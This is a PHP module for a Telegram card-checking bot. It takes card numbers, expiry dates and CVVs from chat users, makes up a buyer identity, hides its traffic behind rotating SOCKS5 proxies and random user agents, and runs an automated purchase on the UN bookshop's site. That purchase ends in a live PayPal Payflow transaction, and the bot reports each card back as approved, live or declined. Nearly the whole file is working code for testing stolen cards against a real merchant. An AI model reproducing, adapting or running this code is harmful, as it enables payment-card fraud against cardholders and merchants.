<?php
list($cmd) = explode(" ", $message);
if($cmd == "/ne" or $cmd == ".ne" or $cmd == "!ne"){
    sendaction($chatId, typing);
    $NameGater ='Never';
$gateway = '/ne :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Payflow 12$</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!ne card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow 12$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #



if(strlen($ano ) == 2 ){
  $ano = "20".$ano;
}


$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];



$retries = 0;
$maxRetries = 3;

while ($retries < $maxRetries) {
    try {

$rotate = rotate();
$socks5 = socks5();

$cookies = tempnam(sys_get_temp_dir(), 'cookie');

$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://shop.un.org/books/coffee-guide-4-24584');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: shop.un.org';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://shop.un.org/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);

if (!$curl) {
    throw new Exception("Error en la conexión en el intento req1, número de intento: $retries");
}
$form_build_id = GetStr($curl,' type="hidden" name="form_build_id" value="', '"');


if ($form_build_id == "null") {
    throw new Exception("Error al extraer form_build_id número de intento: $retries");
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://shop.un.org/books/coffee-guide-4-24584');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: shop.un.org';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://shop.un.org';
$headers[] = 'Referer: https://shop.un.org/books/coffee-guide-4-24584';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'purchased_entity%5B0%5D%5Battributes%5D%5Battribute_format%5D=16&purchased_entity%5B0%5D%5Battributes%5D%5Battribute_language%5D=9&form_build_id='.$form_build_id.'&form_id=commerce_order_item_add_to_cart_form_commerce_product_24584&quantity%5B0%5D%5Bvalue%5D=1&op=Add+to+cart');
$curl = curl_exec($ch);
if (!$curl) {
    throw new Exception("Error en la conexión req2 en el intento 2, número de intento: $retries");
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://shop.un.org/cart');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: shop.un.org';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Referer: https://shop.un.org/books/coffee-guide-4-24584';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);

if (!$curl) {
    throw new Exception("Error en la conexión 3 en el intento 3, número de intento: $retries");
}

$form_build_id2 = GetStr($curl,'type="hidden" name="form_build_id" value="', '"');
$form_id = GetStr($curl,'type="hidden" name="form_id" value="', '"');



if ($form_build_id2 == "null" || $form_id == "null") {
    throw new Exception("Error al extraer form_build_id2 or form_id ,número de intento: $retries");
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://shop.un.org/cart');
$headers = array();
$headers[] = 'Host: shop.un.org';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://shop.un.org';
$headers[] = 'Referer: https://shop.un.org/cart';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'edit_quantity%5B0%5D=1&form_build_id='.$form_build_id2.'&form_id='.$form_id.'&continue_shopping_return_url=%2Fbooks%2Fcoffee-guide-4-24584&op=Checkout');
$curl = curl_exec($ch);

if (!$curl) {
    throw new Exception("Error en la conexión en el intento 3, número de intento: $retries");
}

$form_build_id2 = GetStr($curl,'type="hidden" name="form_build_id" value="', '"');
$url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);

if ($form_build_id2 == "null" || $url == "null") {
    throw new Exception("Error al extraer url or form_id ,número de intento: $retries");
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: shop.un.org';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://shop.un.org';
$headers[] = 'Referer: '.$url.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'uns_contact_information%5Bemail%5D='.urlencode($email).'&uns_contact_information%5Bemail_confirm%5D='.urlencode($email).'&uns_contact_information%5Bfull_name%5D='.$firstname.'+'.$lastname.'&payment_information%5Bbilling_information%5D%5Bfield_full_name%5D%5B0%5D%5Bvalue%5D='.$firstname.'+'.$lastname.'&payment_information%5Bbilling_information%5D%5Bfield_organisation%5D%5B0%5D%5Bvalue%5D=&payment_information%5Bbilling_information%5D%5Baddress%5D%5B0%5D%5Baddress%5D%5Bcountry_code%5D=US&payment_information%5Bbilling_information%5D%5Baddress%5D%5B0%5D%5Baddress%5D%5Blangcode%5D=en&payment_information%5Bbilling_information%5D%5Baddress%5D%5B0%5D%5Baddress%5D%5Baddress_line1%5D='.urlencode($street).'&payment_information%5Bbilling_information%5D%5Baddress%5D%5B0%5D%5Baddress%5D%5Baddress_line2%5D=&payment_information%5Bbilling_information%5D%5Baddress%5D%5B0%5D%5Baddress%5D%5Blocality%5D=+'.urlencode($city).'&payment_information%5Bbilling_information%5D%5Baddress%5D%5B0%5D%5Baddress%5D%5Badministrative_area%5D='.$regioncode.'&payment_information%5Bbilling_information%5D%5Baddress%5D%5B0%5D%5Baddress%5D%5Bpostal_code%5D='.urlencode($zip).'&payment_information%5Bbilling_information%5D%5Bfield_phone_number%5D%5B0%5D%5Bvalue%5D=7258342123&coupon_redemption%5Bform%5D%5Bcode%5D=&form_build_id='.$form_build_id2.'&form_id=commerce_checkout_flow_uns_multistep&op=Save+%26+Continue');
$curl = curl_exec($ch);

if (!$curl) {
    throw new Exception("Error en la conexión en el intento 3, número de intento: $retries");
}
$form_build_id2 = GetStr($curl,'type="hidden" name="form_build_id" value="', '"');
$url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: shop.un.org';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://shop.un.org';
$headers[] = 'Referer: '.$url.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_build_id='.$form_build_id2.'&form_id=commerce_checkout_flow_uns_multistep&op=Pay+and+complete+purchase');
$curl = curl_exec($ch);

if (!$curl) {
    throw new Exception("Error en la conexión en el intento 3, número de intento: $retries");
}
$form_build_id2 = GetStr($curl,'type="hidden" name="form_build_id" value="', '"');
$SECURETOKEN = GetStr($curl,'type="hidden" name="SECURETOKEN" value="', '"');
$SECURETOKENID = GetStr($curl,'type="hidden" name="SECURETOKENID" value="', '"');


if ($SECURETOKENID == "null" || $SECURETOKEN == "null") {
    throw new Exception("Error al extraer SECURETOKEN or SECURETOKENID ,número de intento: $retries");
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payflowlink.paypal.com/');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: payflowlink.paypal.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://shop.un.org';
$headers[] = 'Referer: https://shop.un.org/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'SECURETOKEN='.$SECURETOKEN.'&SECURETOKENID='.$SECURETOKENID.'&form_build_id='.$form_build_id2.'&form_id=commerce_checkout_flow_uns_multistep');
$curl = curl_exec($ch);

if (!$curl) {
    throw new Exception("Error en la conexión en el intento 3, número de intento: $retries");
}

$CSRF_TOKEN = GetStr($curl,'<input name="CSRF_TOKEN" type="hidden" value="', '"');
$INVOICE = GetStr($curl,'<input name="INVOICE" type="hidden" value="', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payflowlink.paypal.com/processTransaction.do');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: payflowlink.paypal.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://payflowlink.paypal.com';
$headers[] = 'Referer: https://payflowlink.paypal.com/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'subaction=&CARDNUM='.$cc.'&EXPMONTH='.$mes.'&EXPYEAR='.$ano.'&CVV2='.$cvv.'&startdate_month=&startdate_year=&issue_number=&billingAddress1='.urlencode($street).'&billingAddress2=&billingCity=+'.urlencode($city).'&billingZip='.urlencode($zip).'&PHONE=&EMAIL='.urlencode($email).'&billing_as_shipping=1&COUNTRYTOSHIP=US&shippingAddress1='.urlencode($street).'&shippingAddress2=&shippingCity=+'.urlencode($city).'&shippingZip='.urlencode($zip).'&shippingPhone=&shippingEmail=&METHOD=C&TYPE=S&PAYMETHOD=C&SHIPAMOUNT=0.00&TAX=0.00&INVOICE='.$INVOICE.'&DISABLERECEIPT=TRUE&flag3dSecure=&CURRENCY=USD&STATE='.$regioncode.'&SECURETOKEN='.$SECURETOKEN.'&SECURETOKENID='.$SECURETOKENID.'&PARMLIST=&MODE=LIVE&CSRF_TOKEN='.$CSRF_TOKEN.'&referringTemplate=templatea');
$curl = curl_exec($ch);

if (!$curl) {
    throw new Exception("Error en la conexión en el intento 3, número de intento: $retries");
}
$RESPMSG = GetStr($curl,'<input type="hidden" name="RESPMSG" value="', '"');
$PROCCVV2 = GetStr($curl,'input type="hidden" name="PROCCVV2" value="', '"');
$PROCAVS = GetStr($curl,'<input type="hidden" name="CVV2MATCH" value="', '"');
        break; // salir del bucle si todo sale bien
    } catch (Exception $e) {
        $retries++;
        echo "Intento $retries: " . $e->getMessage() . "\n";
        if ($retries >= $maxRetries) {
            $text = Textretries();
            bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
            return;
        }
    }
}
$resp = "$RESPMSG |cvv: $PROCCVV2| cvvm :$PROCAVS";
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow 12$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if($PROCCVV2 == "N" AND $PROCAVS == "U"){
$status = "APPROVED ✅";
$response = "APPROVED |cvv: $PROCCVV2| cvvm :$PROCAVS ✅";
}elseif($PROCCVV2 == "N" AND $PROCAVS == "N"){
$status = "APPROVED ✅";
$response = "APPROVED |cvv: $PROCCVV2| cvvm :$PROCAVS ✅";
}elseif (strpos($result2, 'Your order is confirmed') || (strpos($result2,"Thank_you"))) {
    $status = "Approved! ✅";
    $response = "Charger (12$) ";
}elseif (strpos($result, "generic_decline")){ 
$status = "Live🟩";
$response = "CVV 🟩";
}elseif (strpos($result2, "card_error_authentication_required") ||(strpos($result2,'three_d_secure_redirect'))){ 
$status = "Declined! 🔴";
$response = "3D Card.❌";
}elseif (strpos($result2, "Your card does not support this type of purchase")){ 
$status = "Declined! 🔴";
$response = "Your card does not support this type of purchase";
}elseif (strpos($result2, "do_not_honor")){ 
$status = "Declined! 🔴";
$response = "do_not_honor";
}elseif (strpos($result2, 'he transaction total has been updated to reflect added tax based on your shipping country. Please review the new total and confirm your payment.') || (strpos($result2,"Verification steps confirmed. Your payment is processing"))) {
    $status = "Approved!🟩";
    $response = " Approved Card! 🟩";
}
elseif (strpos($result2, "invalid_account")){ 
$status = "Declined! 🔴";
$response = "invalid_account";

}elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
    $status = "<b>CARD DECLINED ❌</b>";
    $response = "Your card does not support this type of purchase🟥";
}elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
    $status = "<b>CARD DECLINED ❌</b>";
    $response = "<b>LOST CARD</b>";
  }
  elseif ((strpos($result2, "fraudulent")) || (strpos($result2, "lost_card")) || (strpos($result2, "fraudulent card"))){
    $status = "<b>Declined! 🔴</b>";
    $response = "<b>FRAUDULENT CARD</b>";
  }elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
    $status = "<b>CARD EXPIRED ❌</b>";
    $response = "<b>EXPIRED CARD</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>INVALID CARD ❌</b>";
    $response = "<b>INCORRECT NUMBER</b>";
  }
  elseif ((strpos($result2, 'Sorry, there was an error completing your purchase -- please try again.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
    $status = "<b>Declined! 🔴</b>";
    $response = "<b>try again</b>";
  }
  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'incorrect-number')) || (strpos($result2, 'incorrect_number'))){
$status = "<b>Declined! 🔴</b>";
$response = "<b>INCORRECT NUMBER</b>";
}elseif (strpos($result2, "generic_decline")){
$status = "<b>Declined! 🔴</b>";
$response = "<b>GENERIC DECLINE</b>";
}else{
$status = "Declined! 🔴";
$response = "$resp";
   }

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow 12$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


}

?>

